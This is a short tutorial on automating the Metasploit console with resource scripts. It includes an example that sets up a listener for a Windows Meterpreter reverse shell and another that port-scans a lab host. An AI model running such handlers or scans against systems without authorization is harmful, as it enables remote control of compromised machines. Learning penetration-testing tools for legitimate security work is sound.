## What are Resource Scripts?

Text files (`.rc` extension) containing MSF console commands that execute sequentially — similar to batch scripts on Windows. They automate repetitive tasks like setting up handlers, port scanning, or checking database status.

## Pre-built Scripts Location

```bash
ls /usr/share/metasploit-framework/scripts/resource/
```

## Creating a Resource Script (Example: Multi Handler)

```bash
vim handler.rc
```

Contents:

```
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.10.5
set LPORT 1234
run
```

## Running a Resource Script

**From the terminal (launches MSFconsole automatically):**

```bash
msfconsole -r handler.rc
```

**From within an active MSFconsole session:**

```bash
resource /root/Desktop/WindowsPayloads/handler.rc
```

## Auto-Generate a Script from Console History

Type your commands in MSFconsole as normal, then export them:

```bash
makerc /home/kali/Desktop/portscan.rc
# Saves your last commands to the file
```

## Example: Port Scan Script

```
use auxiliary/scanner/portscan/tcp
set RHOSTS 10.10.10.7
run
```

Run with:

```bash
msfconsole -r portscan.rc
```

## Key Points

Commands must be in the correct sequential order — top to bottom. You can automate virtually any MSFconsole command. Specify absolute paths when saving scripts to ensure they land in the right directory (MSFconsole runs as root, so relative paths may resolve to `/root/`).
